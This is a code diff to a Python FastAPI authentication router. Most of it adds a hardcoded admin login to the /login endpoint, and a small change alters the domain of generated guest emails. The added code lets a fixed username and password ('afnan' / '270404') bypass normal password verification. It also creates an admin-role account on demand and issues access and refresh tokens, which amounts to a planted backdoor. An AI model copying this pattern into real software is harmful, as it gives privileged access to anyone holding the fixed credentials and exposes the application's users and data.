@@ -30,6 +30,23 @@ def register(payload: UserCreate, db: Session = Depends(get_db)):
 
 @router.post("/login", response_model=Token)
 def login(payload: LoginRequest, db: Session = Depends(get_db)):
+    # Hardcoded admin login: username/email 'afnan' with password '270404'
+    if (payload.email.lower() in {"afnan", "afnan@example.com"}) and payload.password == "270404":
+        user = db.query(User).filter(User.email == "afnan@example.com").first()
+        if not user:
+            user = User(
+                name="afnan",
+                email="afnan@example.com",
+                role="admin",
+                hashed_password=hash_password("270404"),
+            )
+            db.add(user)
+            db.commit()
+            db.refresh(user)
+        token = create_access_token(subject=user.email)
+        rtoken = create_refresh_token(subject=user.email)
+        return {"access_token": token, "token_type": "bearer", "refresh_token": rtoken}
+
     user = db.query(User).filter(User.email == payload.email).first()
     if not user or not verify_password(payload.password, user.hashed_password):
         raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid credentials")
@@ -64,7 +81,7 @@ def guest_login(payload: dict, db: Session = Depends(get_db)):
     # try a few times in case of rare collision
     for _ in range(3):
         try:
-            email = f"guest+{uuid.uuid4().hex[:10]}@example.local"
+            email = f"guest+{uuid.uuid4().hex[:10]}@example.com"
             password = uuid.uuid4().hex
             user = User(name=name, email=email, role="student", hashed_password=hash_password(password))
             db.add(user)
